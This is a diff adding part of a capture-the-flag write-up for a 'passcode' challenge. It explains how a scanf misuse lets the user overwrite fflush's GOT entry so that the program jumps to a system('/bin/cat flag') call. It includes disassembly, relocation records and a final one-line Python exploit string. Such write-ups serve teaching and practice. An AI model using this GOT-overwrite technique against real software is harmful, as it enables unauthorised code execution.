@@ -263,9 +263,154 @@ We can see that is the same word `yaaa`. This proves that we have overwritten th
 So, we can overwrite the location at which `scanf()` will read our input for the 1st passcode. This is because of the [incorrect usage](#incorrect-usage) of `scanf()`.
 
 This opens up and exploit path for us.
+
 If we look at the code, we can see that it calls `system()` in order to `cat` out the flag.
+
+```c title="passcode.c"
+# --- snip ---
+
+        system("/bin/cat flag");
+
+# --- snip ---
+```
+
 We need to somehow execute this code.
 
 ```
+pwndbg> disassemble login
+Dump of assembler code for function login:
 
+# --- snip ---
+
+   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
+   0x080492c3 <+205>:	push   eax
+   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
+
+# --- snip ---
+
+End of assembler dump.
+```
+
+We can see that the address of the `system()` setup is `0x080492bd`. 
+This is what we want to pass as input to `scanf()`.
+
+But we still haven't decided where we want to read this address.
+
+Looking at the challenge code, we can see that the `fflush()` call is made right after `scanf()`.
+
+```c title="passcode.c"
+# --- snip ---
+
+    scanf("%d", passcode1);
+    fflush(stdin);
+
+# --- snip ---
+```
+
+It does not have any conditions either, which means it will be executed no matter what.
+
+## GOT overwrite
+
+> The Global Offset Table, or GOT, is a section of a computer program's (executables and shared libraries) memory used to enable computer program code compiled as an ELF file to run correctly, independent of the memory address where the program's code or data is loaded at runtime.[1]\
+>It maps symbols in programming code to their corresponding absolute memory addresses to facilitate Position Independent Code (PIC) and Position Independent Executables (PIE)[2] which are loaded[3] to a different memory address each time the program is started. The runtime memory address, also known as absolute memory address of variables and functions is unknown before the program is started when PIC or PIE code is run[4] so cannot be hardcoded during compilation by a compiler.
+>
+> — Wikipedia
+
+In layman's terms, the GOT (Global Offset Table) is needed to help programs find and use functions and variables that are not defined in the program itself but are instead found in shared libraries (like libc.so on Linux).
+
+The GOT is filled in at runtime, usually by the dynamic linker and stores the real memory addresses of these shared library functions.
+
+```
+Global Offset Table      
+┌───────────────────────┐   
+│        fflush         │   
+│                       │─────┐
+├───────────────────────┤     │ 
+│        printf         │     │
+│                       │     │
+├───────────────────────┤     │
+|          ...          │     │
+│                       │     │
+└───────────────────────┘     │
+                              │
+libc.so.6──────────────────┐  │
+│  ┌───────┐               │  │
+│  │fflush │◀─────────────────┘       
+│  └───────┘               │
+│  ┌───────┐               │  
+│  │system │               │  
+│  └───────┘               │
+│                          │
+│   ......                 │
+│                          │
+└──────────────────────────┘ 
+```
+
+If we find the GOT address of `fflush()` and pass as the last 4 bytes in the `name` buffer, we can overwrite the GOT entry at the address of `fflush()` with the address of `system("/bin/cat flag");`.
+
+This will cause `system("/bin/cat flag");` to be executed when the program calls `fflush()`
+
+```
+Global Offset Table      
+┌───────────────────────┐   
+│        fflush         │   
+│                       │─────┐
+├───────────────────────┤     │ 
+│        printf         │     │
+│                       │     │
+├───────────────────────┤     │
+|          ...          │     │
+│                       │     │
+└───────────────────────┘     │
+                              │
+libc.so.6──────────────────┐  │
+│  ┌───────┐               │  │
+│  │fflush │               │  │
+│  └───────┘               │  │
+│  ┌───────┐               │  │
+│  │system │◀─────────────────┘   
+│  └───────┘               │
+│                          │
+│   ......                 │
+│                          │
+└──────────────────────────┘  
+```
+
+Let's checkout the GOT for the challenge program.
+
+```
+passcode@ubuntu:~$ objdump -R ./passcode
+
+# --- snip ---
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804bff8 R_386_GLOB_DAT    __gmon_start__@Base
+0804bffc R_386_GLOB_DAT    stdin@GLIBC_2.0
+0804c00c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.34
+0804c010 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+0804c018 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
+0804c01c R_386_JUMP_SLOT   getegid@GLIBC_2.0
+0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0
+0804c024 R_386_JUMP_SLOT   system@GLIBC_2.0
+0804c028 R_386_JUMP_SLOT   exit@GLIBC_2.0
+0804c02c R_386_JUMP_SLOT   setregid@GLIBC_2.0
+0804c030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
+
+# --- snip ---
+```
+
+We can see that the address of `fflush()` is `0x0804c014`.
+Importantly, it also does not have any terminating bytes (`0x00`, `0x0a`, `0x09`, etc). This means that our `scanf()` input will not be terminated abruptly.
+
+## Exploit
+
+We have all the requirements to craft a successfull exploit.
+	- [x] Number padding bytes: `96`
+	- [x] GOT address of `func()`: `0x0804c014`
+ 	- [x] Address of `system("/bin/cat flag");` setup: `0x080492bd`. We have to pass this as a decimal.
+
+```
+python -c "print('a'*96 + '\x14\xc0\x04\x08' + '134517437')" | ./passcode
 ```
